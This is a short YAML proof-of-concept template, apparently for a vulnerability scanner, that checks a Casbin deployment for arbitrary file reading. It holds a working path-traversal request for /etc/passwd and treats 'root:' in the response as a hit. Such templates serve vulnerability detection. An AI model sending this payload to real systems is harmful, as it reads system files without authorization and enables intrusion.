name: poc-yaml-Casbin-Directory
description: >-
  任意文件读取
alwaysExecute: false
matchCount: 1
rules:
  - method: GET
    path: /static/../../../../../../../../../../../etc/passwd
    expression:
      status: 200
      body_all: ["root:"]